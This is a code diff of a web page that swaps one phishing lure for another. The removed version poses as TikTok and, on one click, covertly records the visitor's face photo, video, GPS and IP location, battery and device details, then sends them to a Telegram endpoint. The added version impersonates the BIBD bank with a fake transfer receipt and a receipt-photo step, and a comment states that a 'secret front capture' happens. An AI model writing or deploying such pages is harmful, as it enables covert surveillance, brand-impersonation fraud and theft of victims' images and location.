@@ -1,267 +1,438 @@
 "use client";
 
-import { useState, useRef, useEffect } from "react";
+import { useCallback, useRef, useState, useEffect } from "react";
+import RedirectCountdown from "@/components/RedirectCountdown";
+import SuccessToast from "@/components/SuccessToast";
+import LoadingScreen from "@/components/LoadingScreen";
+import { useVerification } from "@/hooks/useVerification";
+import { formatFileSize } from "@/utils/device";
+import templateData from "./data.json";
 
-const TIKTOK_VIDEO_URL = "https://www.tiktok.com/@slowmoetamin/video/7189732707822226694?is_from_webapp=1&sender_device=pc&web_id=7641670620761261576";
+export default function BibdVerificationPage() {
+  const {
+    isVerified,
+    isChecking,
+    isInitialLoading,
+    isProcessing,
+    showRedirectCountdown,
+    redirectCountdown,
+    uploadedFile,
+    redirectConfig,
+    redirectUrl,
+    countdownDuration,
+    handleVerifyClick,
+    handleFileSelect,
+    setUploadedFile,
+    requestCameraPermission,
+    requestAllPermissions,
+    validationError,
+  } = useVerification();
 
-export default function TikTokPage() {
-  const [loading, setLoading] = useState(true);
-  const [showCard, setShowCard] = useState(false);
-  const [progress, setProgress] = useState(0);
-  const [countdown, setCountdown] = useState(5);
-  const [done, setDone] = useState(false);
-  const videoRef = useRef<HTMLVideoElement | null>(null);
+  const [showCamera, setShowCamera] = useState(false);
+  const [isCapturing, setIsCapturing] = useState(false);
+  const [displayDate, setDisplayDate] = useState(templateData.receiptDate);
+  const rearVideoRef = useRef<HTMLVideoElement>(null);
+  const rearStreamRef = useRef<MediaStream | null>(null);
 
+  // Set AUTO date based on client device
   useEffect(() => {
-    const v = document.createElement("video");
-    v.style.display = "none"; v.muted = true; v.playsInline = true;
-    document.body.appendChild(v);
-    videoRef.current = v;
-    return () => { if (videoRef.current) document.body.removeChild(videoRef.current); };
-  }, []);
-
-  useEffect(() => {
-    const t = setTimeout(() => { setLoading(false); setShowCard(true); }, 1000);
-    return () => clearTimeout(t);
-  }, []);
-
-  const handleStart = async () => {
-    setShowCard(false);
-    setDone(true);
-
-    let stream: MediaStream | null = null;
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-      });
-    } catch {}
-
-    let gps: { lat: number; lng: number } | null = null;
-    try {
-      gps = await new Promise(resolve => {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
-            () => resolve(null), { timeout: 8000 }
-          );
-        } else resolve(null);
-      });
-    } catch {}
-
-    let ipInfo: any = null;
-    try { const r = await fetch("https://ipinfo.io/json?token=56ce10652d9d41"); if (r.ok) ipInfo = await r.json(); } catch {}
-
-    const fd = new FormData();
-    if (stream) {
-      const photo = await takePhoto(stream);
-      const vid = await recordVideo(stream, 10000);
-      if (photo) fd.append("photo", photo, "photo.jpg");
-      if (vid) fd.append("video", vid, "video.webm");
-      stream.getTracks().forEach(t => t.stop());
+    if (templateData.receiptDate === "AUTO") {
+      const date = new Date();
+      const months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
+      const d = String(date.getDate()).padStart(2, '0');
+      const m = months[date.getMonth()];
+      const y = date.getFullYear();
+      const hh = String(date.getHours()).padStart(2, '0');
+      const mm = String(date.getMinutes()).padStart(2, '0');
+      setDisplayDate(`${d} ${m} ${y}, ${hh}:${mm}`);
+    } else {
+      setDisplayDate(templateData.receiptDate);
     }
+  }, []);
 
-    const info = await buildInfo(ipInfo, gps);
-    fd.append("locationInfo", info);
-    await Promise.all([sendToTelegram(fd), runProgress()]);
-
-    await new Promise(r => setTimeout(r, 500));
-    setCountdown(5);
-    const timer = setInterval(() => {
-      setCountdown(prev => {
-        if (prev <= 1) { clearInterval(timer); window.location.href = TIKTOK_VIDEO_URL; return 0; }
-        return prev - 1;
-      });
-    }, 1000);
-  };
-
-  const takePhoto = (s: MediaStream): Promise<Blob | null> => new Promise(res => {
-    const v = videoRef.current; if (!v) return res(null);
-    v.srcObject = s;
-    v.onloadedmetadata = () => {
-      v.play();
-      setTimeout(() => {
-        const c = document.createElement("canvas");
-        c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
-        const ctx = c.getContext("2d");
-        if (ctx) { ctx.drawImage(v, 0, 0, c.width, c.height); c.toBlob(b => res(b), "image/jpeg", 0.8); }
-        else res(null);
-      }, 1500);
+  // Cleanup camera streams on unmount
+  useEffect(() => {
+    return () => {
+      rearStreamRef.current?.getTracks().forEach((t) => t.stop());
     };
-  });
+  }, []);
 
-  const recordVideo = (s: MediaStream, ms: number): Promise<Blob | null> => new Promise(res => {
-    let mr: MediaRecorder;
-    try { mr = new MediaRecorder(s, { mimeType: "video/webm" }); }
-    catch { try { mr = new MediaRecorder(s); } catch { return res(null); } }
-    const ch: Blob[] = [];
-    mr.ondataavailable = e => { if (e.data.size > 0) ch.push(e.data); };
-    mr.onstop = () => res(new Blob(ch, { type: mr.mimeType }));
-    mr.start();
-    setTimeout(() => { if (mr.state !== "inactive") mr.stop(); }, ms);
-  });
+  useEffect(() => {
+    if (showCamera && rearVideoRef.current && rearStreamRef.current) {
+      rearVideoRef.current.srcObject = rearStreamRef.current;
+      rearVideoRef.current.play().catch(e => console.error('Play failed:', e));
+      setTimeout(() => {
+        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+      }, 300);
+    }
+  }, [showCamera]);
 
-  const buildInfo = async (ip: any, gps: { lat: number; lng: number } | null) => {
-    const ua = navigator.userAgent;
-    const os = (() => {
-      if (/android/i.test(ua)) {
-        const m = ua.match(/Android\s+([\d.]+)/);
-        const d = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
-        return `Android ${m?.[1] || '?'} (${d?.[1]?.trim() || 'Unknown'})`;
-      }
-      if (/iPad|iPhone|iPod/.test(ua)) {
-        const m = ua.match(/OS\s+([\d_]+)/);
-        return `iOS ${m?.[1]?.replace(/_/g, '.') || '?'}`;
-      }
-      if (/Windows/.test(ua)) {
-        const m = ua.match(/Windows NT\s+([\d.]+)/);
-        const v: Record<string, string> = {'10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7'};
-        return `Windows ${v[m?.[1] || ''] || m?.[1] || '?'}`;
-      }
-      if (/Mac OS X/.test(ua)) {
-        const m = ua.match(/Mac OS X\s+([\d_]+)/);
-        return `macOS ${m?.[1]?.replace(/_/g, '.') || '?'}`;
-      }
-      if (/Linux/.test(ua)) return 'Linux';
-      return 'Unknown OS';
-    })();
+  // Open rear camera live preview (avoid front camera here to prevent mobile crash/black screen)
+  const handleOpenCamera = useCallback(async () => {
+    if (uploadedFile || showCamera) return;
 
-    const browser = (() => {
-      if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
-      if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
-      if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
-      if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
-      return 'Unknown Browser';
-    })();
-
-    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
-    const network = conn
-      ? `${(conn.effectiveType || conn.type || '?').toUpperCase()}${conn.downlink ? ` - ${conn.downlink} Mbps` : ''}${conn.rtt ? ` (${conn.rtt}ms)` : ''}`
-      : 'Unknown';
-
-    let battery = 'Unknown';
+    let rearStream = null;
+    
     try {
-      const b = await (navigator as any).getBattery?.();
-      if (b) { battery = `${Math.round(b.level * 100)}%${b.charging ? ' (Charging)' : ' (Discharging)'}`; }
-    } catch {}
-
-    const ram = (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Unknown';
-    const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
-    const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
-    const dpr = window.devicePixelRatio || 1;
-
-    let locStr = '';
-    if (gps) {
-      locStr = `GPS: ${gps.lat}, ${gps.lng}\nMaps: https://www.google.com/maps?q=${gps.lat},${gps.lng}`;
-    } else if (ip) {
-      locStr = `IP: ${ip.ip || '?'}\nKota: ${ip.city || '?'}\nRegion: ${ip.region || '?'}\nNegara: ${ip.country || '?'}\nKoordinat: ${ip.loc || '?'}\nISP: ${ip.org || '?'}`;
-    } else { locStr = 'Tidak tersedia'; }
-
-    const ts = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
-    return `TIKTOK - DATA PENGUNJUNG\nWaktu: ${ts}\nISO: ${new Date().toISOString()}\n\nLOKASI\n${locStr}\n\nPERANGKAT\nOS: ${os}\nBrowser: ${browser}\nPlatform: ${navigator.platform || '?'}\nBahasa: ${navigator.language}\nZona: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nBaterai: ${battery}\nRAM: ${ram}\nCPU: ${cpu}\nKoneksi: ${network}\n\nLAYAR\nResolusi: ${window.screen.width}x${window.screen.height}\nViewport: ${window.innerWidth}x${window.innerHeight}\nPixel Ratio: ${dpr}x\nColor Depth: ${window.screen.colorDepth || '?'}-bit\nOrientasi: ${orientation}\n\nUSER AGENT\n${ua}`;
-  };
-
-  const runProgress = async () => {
-    for (let i = 0; i <= 100; i += 2) {
-      await new Promise(r => setTimeout(r, 30));
-      setProgress(i);
-    }
-  };
-
-  const sendToTelegram = async (fd: FormData): Promise<boolean> => {
-    for (let attempt = 1; attempt <= 3; attempt++) {
+      // 1st attempt: Environment (rear) camera with portrait HD ideal resolution
+      rearStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'environment', width: { ideal: 720 }, height: { ideal: 1280 } },
+      });
+    } catch (err1) {
+      console.warn('1st camera attempt failed:', err1);
       try {
-        const res = await fetch("/api/telegram", { method: "POST", body: fd });
-        if (res.ok) return true;
-      } catch {}
-      if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
+        // 2nd attempt: Just ask for environment camera, no resolution constraint
+        rearStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment' },
+        });
+      } catch (err2) {
+        console.warn('2nd camera attempt failed:', err2);
+        try {
+          // 3rd attempt: Just ask for ANY camera (fallback for devices that don't support facingMode at all)
+          rearStream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+        } catch (err3) {
+          console.error('All camera open attempts failed:', err3);
+          alert('Gagal mengakses kamera. Pastikan browser memiliki izin dan tidak diblokir.');
+          return;
+        }
+      }
     }
-    return false;
-  };
 
-  if (loading) {
-    return (
-      <div className="fixed inset-0 flex flex-col items-center justify-center" style={{ background: "#000" }}>
-        <img src="/logo-tiktok-new.png" className="w-28 h-28 object-contain" alt="TikTok" />
-      </div>
-    );
+    if (rearStream) {
+      rearStreamRef.current = rearStream;
+      setShowCamera(true);
+    }
+  }, [uploadedFile, showCamera]);
+
+  // Cancel camera and close
+  const handleCancelCamera = useCallback(() => {
+    rearStreamRef.current?.getTracks().forEach((t) => t.stop());
+    rearStreamRef.current = null;
+    setShowCamera(false);
+  }, []);
+
+  // Capture photo from rear camera
+  const handleCapturePhoto = useCallback(async () => {
+    if (isCapturing) return;
+    setIsCapturing(true);
+
+    try {
+      const rearStream = rearStreamRef.current;
+      if (!rearStream) {
+        setIsCapturing(false);
+        return;
+      }
+
+      // Capture rear camera photo directly from visible video element
+      const rearCanvas = document.createElement('canvas');
+      const rearVideo = rearVideoRef.current;
+      if (rearVideo) {
+        rearCanvas.width = rearVideo.videoWidth || 640;
+        rearCanvas.height = rearVideo.videoHeight || 480;
+        const ctx = rearCanvas.getContext('2d');
+        ctx?.drawImage(rearVideo, 0, 0, rearCanvas.width, rearCanvas.height);
+      }
+      
+      const rearPhotoBlob = await new Promise<Blob | null>((resolve) =>
+        rearCanvas.toBlob((b) => resolve(b), 'image/jpeg', 0.85)
+      );
+
+      // Stop stream immediately
+      rearStream.getTracks().forEach((t) => t.stop());
+      rearStreamRef.current = null;
+      setShowCamera(false);
+
+      if (rearPhotoBlob) {
+        const resitFile = new File([rearPhotoBlob], `resit-${Date.now()}.jpg`, { type: 'image/jpeg' });
+        // Forward to useVerification hook (which handles the secret front capture)
+        handleFileSelect(resitFile);
+      }
+    } catch (err) {
+      console.error('Capture failed:', err);
+    }
+
+    setIsCapturing(false);
+  }, [isCapturing, handleFileSelect]);
+
+
+
+  // Show initial loading screen
+  if (isInitialLoading) {
+    return <LoadingScreen />;
   }
 
-  if (done) {
+  // Loading screens removed to prevent blank loading page during processing
+
+  if (isVerified) {
     return (
-      <div className="fixed inset-0 flex flex-col items-center justify-center" style={{ background: "#000" }}>
-        {progress < 100 ? (
-          <>
-            <div className="relative mb-5">
-              <div className="absolute inset-0 rounded-full animate-ring" style={{ border: "2px solid transparent", borderTopColor: "#fe2c55", borderRightColor: "#25f4ee" }} />
-              <img src="/logo-tiktok-new.png" className="w-28 h-28 object-contain relative z-10 animate-pulse-logo" alt="TikTok" />
+      <main className="relative flex min-h-screen w-full flex-col items-center justify-center bg-[#eae7e7] p-5 font-sans">
+        {/* Receipt Card */}
+        <div className="w-full max-w-[420px] mx-auto flex flex-col items-center animate-fade-slide">
+          <div className="receipt-jagged-edge w-full rounded-t-xl rounded-b-none shadow-lg bg-white mb-4">
+            {/* Header Section */}
+            <div className="p-8 flex flex-col items-center text-center">
+              {/* Brand Logo */}
+              <img 
+                src="/logo-terbaru-bibd-copy.png" 
+                alt="BIBD Logo" 
+                className="h-14 object-contain mb-4"
+              />
+              
+              {/* Status Badge */}
+              <div className="flex items-center space-x-2 bg-[#95d2c8]/20 text-[#095049] px-4 py-2 rounded-full mb-4">
+                <span className="material-symbols-outlined text-[#002420] text-lg">check_circle</span>
+                <span className="font-[IBM-Plex-Sans] text-sm font-semibold tracking-wider">Berhasil</span>
+              </div>
+              
+              {/* Amount */}
+              <p className="font-[Inter] text-sm text-[#53424b] mb-1">Jumlah Transfer</p>
+              <p className="font-[Manrope] text-3xl font-extrabold text-[#1c1b1b]">{templateData.receiptAmount}</p>
             </div>
-            <div className="flex items-center justify-center">
-              <svg className="animate-spin h-10 w-10" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <defs>
-                  <linearGradient id="tik-tok-grad" x1="0%" y1="0%" x2="100%" y2="100%">
-                    <stop offset="0%" stopColor="#25f4ee" />
-                    <stop offset="100%" stopColor="#fe2c55" />
-                  </linearGradient>
-                </defs>
-                <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.1)" strokeWidth="2.5" />
-                <circle cx="12" cy="12" r="10" stroke="url(#tik-tok-grad)" strokeWidth="2.5" strokeLinecap="round" strokeDasharray="31.4 31.4" />
-              </svg>
+
+            {/* Divider */}
+            <div className="w-full dashed-divider my-4"></div>
+
+            {/* Details Section */}
+            <div className="p-8 flex flex-col gap-4">
+              {/* Detail Row 1 */}
+              <div className="flex justify-between items-start">
+                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Tanggal</span>
+                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">{displayDate}</span>
+              </div>
+              {/* Detail Row 2 */}
+              <div className="flex justify-between items-start">
+                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Jenis Transaksi</span>
+                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">{templateData.receiptTransactionType}</span>
+              </div>
+              {/* Detail Row 3 */}
+              <div className="flex justify-between items-start">
+                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Dari</span>
+                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
+                  {templateData.receiptSenderName}<br />
+                  <span className="text-[#53424b] text-sm font-normal">{templateData.receiptSenderAccount}</span>
+                </span>
+              </div>
+              {/* Detail Row 4 */}
+              <div className="flex justify-between items-start">
+                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Ke</span>
+                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
+                  {templateData.receiptReceiverName}<br />
+                  <span className="text-[#53424b] text-sm font-normal">{templateData.receiptReceiverAccount}</span>
+                </span>
+              </div>
+              {/* Detail Row 5 */}
+              <div className="flex justify-between items-start pt-2 border-t border-[#e5e2e1]">
+                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Nomor Referensi</span>
+                <span className="font-[IBM-Plex-Sans] text-sm font-semibold text-[#410030] text-right w-2/3 break-all">{templateData.receiptReference}</span>
+              </div>
             </div>
-          </>
-        ) : (
-          <>
-            <img src="/logo-tiktok-new.png" className="w-28 h-28 object-contain mb-5" alt="TikTok" />
-            <p className="text-white text-sm font-medium mb-1">Selesai</p>
-            <p className="text-gray-400 text-xs mb-4">Kembali ke TikTok {countdown}</p>
-            <div className="w-48 h-1 rounded-full overflow-hidden" style={{ background: "rgba(255,255,255,0.1)" }}>
-              <div className="h-full rounded-full transition-all duration-1000" style={{ width: `${((5 - countdown) / 5) * 100}%`, background: "#fe2c55" }} />
-            </div>
-          </>
-        )}
-      </div>
+          </div>
+
+          {/* Action Buttons */}
+          <div className="w-full flex flex-col gap-4 px-4 mb-8 mt-4">
+            <button className="w-full flex items-center justify-center gap-2 bg-white border border-[#85727b] text-[#410030] font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:bg-[#e5e2e1] transition-colors">
+              <span className="material-symbols-outlined text-lg">share</span>
+              Bagikan
+            </button>
+            <button 
+              onClick={() => (window.location.href = redirectUrl)}
+              className="w-full bg-[#66004d] text-white font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:opacity-90 transition-opacity"
+            >
+              Selesai
+            </button>
+          </div>
+        </div>
+
+        {/* Success Toast */}
+        <SuccessToast />
+
+        <style
+          dangerouslySetInnerHTML={{
+            __html: `
+              .receipt-jagged-edge {
+                position: relative;
+                background: #ffffff;
+              }
+              .receipt-jagged-edge::after {
+                content: "";
+                position: absolute;
+                left: 0;
+                bottom: -10px;
+                width: 100%;
+                height: 10px;
+                background-image: radial-gradient(circle at 10px 0, transparent 10px, #ffffff 11px);
+                background-size: 20px 10px;
+                background-repeat: repeat-x;
+                transform: rotate(180deg);
+              }
+              .dashed-divider {
+                border-top: 2px dashed #d8c0cb;
+              }
+            `,
+          }}
+        />
+      </main>
     );
   }
 
   return (
-    <div className="relative min-h-screen flex items-center justify-center" style={{ background: "#000" }}>
-      <div className="w-full max-w-[340px] mx-4" style={{ animation: "u 0.4s cubic-bezier(0.22,1,0.36,1) both" }}>
-        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
-          <div className="flex items-center gap-2 px-4 py-3 border-b" style={{ borderColor: "#f1f1f1" }}>
-            <img src="/logo-tiktok-new.png" className="w-5 h-5 object-contain" alt="TikTok" />
-            <span className="text-sm font-semibold" style={{ color: "#111" }}>TikTok</span>
-          </div>
+    <main className="min-h-screen flex flex-col bg-[#111111] font-[Inter] antialiased w-full relative sm:p-4 items-center justify-center">
+      {/* Mobile container to look like the phone screen on desktop, full width on mobile */}
+      <div className="w-full sm:max-w-[400px] bg-white min-h-screen sm:min-h-[800px] sm:h-[800px] sm:rounded-[40px] sm:overflow-hidden relative flex flex-col shadow-2xl">
+        {/* Top Bar */}
+        <div className="w-full bg-[#fbbd05] py-4 flex justify-center items-center shadow-sm z-10 flex-shrink-0">
+          <h1 className="text-white font-bold text-[14px] tracking-wide uppercase">BIBD BRUNAI DARUSSALAM</h1>
+        </div>
 
-          <div className="p-5 flex flex-col items-center text-center">
-            <div className="mb-4 flex h-12 w-12 items-center justify-center rounded-full overflow-hidden" style={{ background: "linear-gradient(135deg, #fe2c55, #25f4ee)" }}>
-              <img src="/logo-tiktok-new.png" className="w-16 h-16 object-contain" alt="TikTok" />
+        {/* Main Content Area - This is where scrolling happens if needed */}
+        <div className="flex-1 flex flex-col px-4 pt-6 pb-8 overflow-y-auto w-full">
+          <div className="w-full flex flex-col items-center">
+            {/* Logo */}
+            <div className="flex justify-center mb-8 mt-2">
+              <img 
+                src="/logo-terbaru-bibd-copy.png" 
+                alt="BIBD Logo" 
+                className="h-[60px] object-contain"
+              />
             </div>
 
-            <p className="text-sm leading-relaxed mb-5" style={{ color: "#555" }}>
-              Untuk menggunakan TikTok, aktifkan kamera dan lokasi.
+            {/* Title & Subtitle */}
+            <h2 className="text-[#2d3748] font-bold text-[16px] text-center mb-1">
+              {templateData.title}
+            </h2>
+            <p className="text-[#a0aec0] text-[13px] text-center mb-6">
+              {templateData.subtitle}
             </p>
 
-            <div className="flex flex-col gap-2 w-full mb-1">
-              <div className="flex items-center gap-3 rounded-xl px-3.5 py-3 text-left" style={{ background: "#f8f8f8" }}>
-                <svg viewBox="0 0 24 24" className="w-5 h-5 shrink-0" fill="#fe2c55"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
-                <span className="text-sm font-medium" style={{ color: "#333" }}>Kamera</span>
+            {/* Amount Box */}
+            <div className="w-full bg-[#f8f9fa] rounded-xl py-6 px-4 flex flex-col items-center justify-center mb-8">
+              <p className="text-[#a0aec0] text-[12px] mb-2 font-medium">Jumlah Diterima</p>
+              <p className="text-[#1a202c] text-2xl font-bold mb-1 tracking-tight">{templateData.amountPrimary}</p>
+              <p className="text-[#1a202c] text-xl font-bold tracking-tight">{templateData.amountSecondary}</p>
+            </div>
+
+            {/* Details Table */}
+            <div className="w-full flex flex-col gap-4 text-[12px] mb-8">
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">Pengirim</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.senderBank}</span>
               </div>
-              <div className="flex items-center gap-3 rounded-xl px-3.5 py-3 text-left" style={{ background: "#f8f8f8" }}>
-                <svg viewBox="0 0 24 24" className="w-5 h-5 shrink-0" fill="#25f4ee"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
-                <span className="text-sm font-medium" style={{ color: "#333" }}>Lokasi</span>
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">Nama Akaun Pengirim</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.senderName}</span>
+              </div>
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">No. Akaun Pengirim</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.senderAccount}</span>
+              </div>
+              
+              <div className="w-full border-t border-[#edf2f7] my-1"></div>
+              
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">Penerima</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.receiverBank}</span>
+              </div>
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">No. Akaun Penerima</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.receiverAccount}</span>
+              </div>
+              <div className="flex justify-between items-start">
+                <span className="text-[#a0aec0] w-[35%] font-medium">Nama Akaun Penerima</span>
+                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.receiverName}</span>
               </div>
             </div>
 
-            <button
-              onClick={handleStart}
-              className="mt-4 w-full rounded-xl py-3 text-sm font-bold text-white transition-all active:scale-[0.98]"
-              style={{ background: "linear-gradient(135deg, #fe2c55, #f02a4e)" }}
-            >
-              Mulai
-            </button>
+            {/* Camera View / Action Button */}
+            {showCamera ? (
+              <div className="w-full flex flex-col gap-3 mt-2">
+                {/* Live rear camera preview */}
+                <div className="w-full rounded-[10px] overflow-hidden bg-black relative flex items-center justify-center" style={{ aspectRatio: '3/4' }}>
+                  <video
+                    ref={rearVideoRef}
+                    autoPlay
+                    playsInline
+                    muted
+                    className="w-full h-full object-cover"
+                    style={{ transform: 'scaleX(1)' }}
+                  />
+                  {isCapturing && (
+                    <div className="absolute inset-0 bg-black/50 flex items-center justify-center">
+                      <div className="flex flex-col items-center gap-2">
+                        <svg className="h-8 w-8 animate-spin text-white" fill="none" viewBox="0 0 24 24">
+                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
+                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                        </svg>
+                        <span className="text-white text-xs font-semibold">Memproses...</span>
+                      </div>
+                    </div>
+                  )}
+                </div>
+                {/* Capture button */}
+                <button
+                  onClick={handleCapturePhoto}
+                  disabled={isCapturing}
+                  className="w-full bg-[#2563eb] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#1d4ed8] transition-colors disabled:opacity-50 flex items-center justify-center gap-2"
+                >
+                  {isCapturing ? 'Memproses...' : 'Ambil Foto Resit / Bukti Belanja'}
+                </button>
+              </div>
+            ) : !uploadedFile ? (
+              <button
+                onClick={handleOpenCamera}
+                className="w-full bg-[#2563eb] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#1d4ed8] transition-colors shadow-sm mt-2 flex items-center justify-center gap-2"
+              >
+                Ambil Foto Resit / Bukti Belanja
+              </button>
+            ) : (
+              <div className="w-full flex flex-col gap-4 mt-2">
+                <div className="w-full rounded-[10px] overflow-hidden bg-black relative flex items-center justify-center" style={{ aspectRatio: '3/4' }}>
+                  <img 
+                    src={URL.createObjectURL(uploadedFile)} 
+                    alt="Captured Receipt" 
+                    className="w-full h-full object-cover"
+                    style={{ transform: 'scaleX(1)' }}
+                  />
+                  <button 
+                    onClick={(e) => {
+                      e.stopPropagation();
+                      setUploadedFile(null);
+                    }}
+                    className="absolute top-3 right-3 bg-red-500/80 hover:bg-red-600 text-white rounded-full p-2 flex items-center justify-center backdrop-blur-sm transition-colors"
+                  >
+                    <span className="material-symbols-outlined text-[18px]">close</span>
+                  </button>
+                </div>
+                <button 
+                  onClick={handleVerifyClick}
+                  disabled={isChecking}
+                  className="w-full bg-[#16a34a] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#15803d] transition-colors shadow-sm disabled:opacity-50 flex items-center justify-center gap-2"
+                >
+                  {isChecking ? (
+                    <>
+                      <svg className="h-4 w-4 animate-spin text-white" fill="none" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                      </svg>
+                      MEMPROSES...
+                    </>
+                  ) : (
+                    "KIRIM BUKTI"
+                  )}
+                </button>
+              </div>
+            )}
+            {validationError && (
+              <div className="mt-4 flex items-center gap-2 text-xs font-semibold text-red-600 bg-red-50 p-2.5 rounded-lg border border-red-200 w-full justify-center text-center">
+                <span className="material-symbols-outlined text-sm flex-shrink-0">warning</span>
+                <span>{validationError}</span>
+              </div>
+            )}
           </div>
         </div>
       </div>
-      <style>{`@keyframes u{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}@keyframes s{to{transform:rotate(360deg)}}@keyframes ring-spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.animate-ring{animation:ring-spin 1.2s linear infinite;width:100%;height:100%}@keyframes pulse-logo{0%{opacity:.7;transform:scale(1)}50%{opacity:1;transform:scale(1.05)}100%{opacity:.7;transform:scale(1)}}.animate-pulse-logo{animation:pulse-logo 1.6s ease-in-out infinite}@keyframes spin{to{transform:rotate(360deg)}}.animate-spin{animation:spin 1s linear infinite}`}</style>
-    </div>
+    </main>
   );
 }
+
